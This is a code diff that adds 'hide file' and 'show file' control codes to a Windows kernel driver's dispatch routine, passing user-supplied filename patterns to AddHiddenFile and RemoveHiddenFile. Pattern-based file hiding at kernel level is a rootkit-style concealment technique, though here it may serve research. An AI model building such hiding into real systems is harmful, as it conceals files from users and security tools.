@@ -163,6 +163,48 @@ _Use_decl_annotations_ NTSTATUS DispatchFunction(IN OUT PDEVICE_OBJECT DeviceObj
                     break;
                 }
 
+                case IOCTL_HIDE_FILE:
+                    bDoHide = TRUE;
+                case IOCTL_SHOW_FILE: {
+                    MyDbgPrint("IOCTL_%s_FILE: Received %ld bytes", bDoHide ? "HIDE" : "SHOW",
+                               pStackLocation->Parameters.DeviceIoControl.InputBufferLength);
+                    PHIDDEN_FILE pHiddenFile = (PHIDDEN_FILE)Irp->AssociatedIrp.SystemBuffer;
+                    CONST ULONG ulHiddenFileLength = pHiddenFile->FileNameLength;
+                    CONST LPCWSTR lpHiddenFileName = pHiddenFile->FileName;
+
+                    if (ulHiddenFileLength == 0 ||
+                        ulHiddenFileLength > ARRAYSIZE(pHiddenFile->FileName)) {
+                        MyDbgPrint("Invalid pattern length: %lu (must be between 1 and %lu)",
+                                   ulHiddenFileLength, ARRAYSIZE(pHiddenFile->FileName));
+                        Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
+                        break;
+                    }
+                    MATCH_TYPE matchType = (MATCH_TYPE)(pHiddenFile->MatchType);
+                    MyDbgPrint("%s pattern: %.*ws [Match type: %ld]",
+                               bDoHide ? "Hiding" : "Showing", ulHiddenFileLength, lpHiddenFileName,
+                               matchType);
+                    if (bDoHide) {
+                        status = AddHiddenFile(lpHiddenFileName, ulHiddenFileLength, matchType);
+                        if (!NT_SUCCESS(status)) {
+                            MyDbgPrint("Failed to hide pattern (error: %d)", status);
+                            Irp->IoStatus.Status = status;
+                            break;
+                        }
+                        MyDbgPrint("Pattern hidden");
+                    } else {
+                        status = RemoveHiddenFile(lpHiddenFileName, ulHiddenFileLength, matchType);
+                        if (!NT_SUCCESS(status)) {
+                            MyDbgPrint("Failed to show pattern (error: %d)", status);
+                            Irp->IoStatus.Status = status;
+                            break;
+                        }
+                        MyDbgPrint("Pattern shown");
+                    }
+
+                    Irp->IoStatus.Status = STATUS_SUCCESS;
+                    break;
+                }
+
                 default:
                     MyDbgPrint("Unknown IOCTL code: %lx", ulIoControlCode);
                     Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
